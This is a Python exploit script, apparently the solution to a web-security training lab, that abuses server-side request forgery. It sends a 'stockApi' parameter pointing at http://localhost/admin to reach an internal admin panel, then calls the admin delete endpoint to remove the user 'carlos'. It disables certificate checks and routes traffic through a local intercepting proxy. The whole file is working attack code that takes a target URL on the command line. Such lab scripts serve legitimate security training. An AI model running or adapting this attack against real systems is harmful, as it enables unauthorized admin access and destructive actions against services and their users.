import sys
import requests
import time
import urllib3
urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

RED = "\033[91m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
CYAN = "\033[96m"
BLUE = "\033[94m"
RESET = "\033[0m"

proxies = {"http": "http://127.0.0.1:8080", "https": "http://127.0.0.1:8080"}

def ssrf(url):
    headers = {"Content-Type": "application/x-www-form-urlencoded"}
    data = {"stockApi": "http://localhost/admin"}
    r = requests.post(url + '/product/stock', headers=headers, data=data, verify=False, proxies=proxies)
    
    if "Admin panel" not in r.text:
        print(f"{RED}[!] Failed to access Admin panel{RESET}")
        sys.exit(-1)
    print(f"{RED}[+] Admin panel accessed{RESET}")
    time.sleep(1)

    print(f"{GREEN}[+] Deleting user carlos{RESET}")
    data = {"stockApi": "http://localhost/admin/delete?username=carlos"}
    r = requests.post(url + '/product/stock', headers=headers, data=data, verify=False, proxies=proxies)
    
    if "Solved" in r.text:
        print(f"{BLUE}[+] User carlos Deleted!{RESET}")
    else:
        print(f"{RED}[!] Failed to delete user carlos{RESET}")

def main():
    if len(sys.argv) != 2:
        print(f"{YELLOW}[+] Usage: python {sys.argv[0]} <url>{RESET}")
        sys.exit(-1)
    
    print(f"{CYAN}[+] Exploiting SSRF.............{RESET}")
    url = sys.argv[1]
    ssrf(url)

if __name__ == "__main__":
    main()